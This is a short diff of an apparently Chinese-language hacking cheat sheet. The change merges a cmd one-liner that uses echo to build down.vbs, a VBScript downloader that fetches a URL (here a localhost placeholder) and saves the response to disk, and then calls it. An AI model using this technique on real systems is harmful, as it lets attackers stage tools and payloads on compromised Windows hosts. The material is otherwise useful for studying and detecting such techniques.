@@ -58,8 +58,7 @@ End Function >> down.vbs
 ```
 使用 CMD 製作下載 down.vbs 
 ```
-echo Download "http://127.0.0.1/", "test.txt" > down.vbs & echo Function Download(strUrl, strFile) >> down.vbs & echo Set xPost = CreateObject("MSXML2.ServerXMLHTTP") >> down.vbs & echo xPost.Open "GET", strUrl,0 >> down.vbs & echo xPost.Send() >> down.vbs
-& echo Set sGet = CreateObject("ADODB.Stream") >> down.vbs & echo sGet.Mode = 3 >> down.vbs & echo sGet.Type = 1 >> down.vbs & echo sGet.Open() >> down.vbs & echo sGet.Write(xPost.responseBody) >> down.vbs & echo sGet.SaveToFile strFile,2 >> down.vbs &echo End Function >> down.vbs
+echo Download "http://127.0.0.1/", "test.txt" > down.vbs & echo Function Download(strUrl, strFile) >> down.vbs & echo Set xPost = CreateObject("MSXML2.ServerXMLHTTP") >> down.vbs & echo xPost.Open "GET", strUrl,0 >> down.vbs & echo xPost.Send() >> down.vbs & echo Set sGet = CreateObject("ADODB.Stream") >> down.vbs & echo sGet.Mode = 3 >> down.vbs & echo sGet.Type = 1 >> down.vbs & echo sGet.Open() >> down.vbs & echo sGet.Write(xPost.responseBody) >> down.vbs & echo sGet.SaveToFile strFile,2 >> down.vbs &echo End Function >> down.vbs
 ```
 Call down.vbs 
 ```
